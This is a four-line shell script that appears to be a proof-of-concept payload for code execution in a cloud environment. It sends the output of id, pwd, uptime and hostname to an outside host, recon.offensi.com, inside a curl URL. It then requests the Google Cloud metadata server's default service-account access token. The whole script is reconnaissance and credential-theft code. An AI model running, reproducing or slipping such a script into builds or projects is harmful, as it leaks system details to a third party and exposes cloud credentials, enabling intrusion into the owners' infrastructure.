#!/bin/sh

curl http://recon.offensi.com/`id;pwd;uptime;hostname`
curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
exit 1
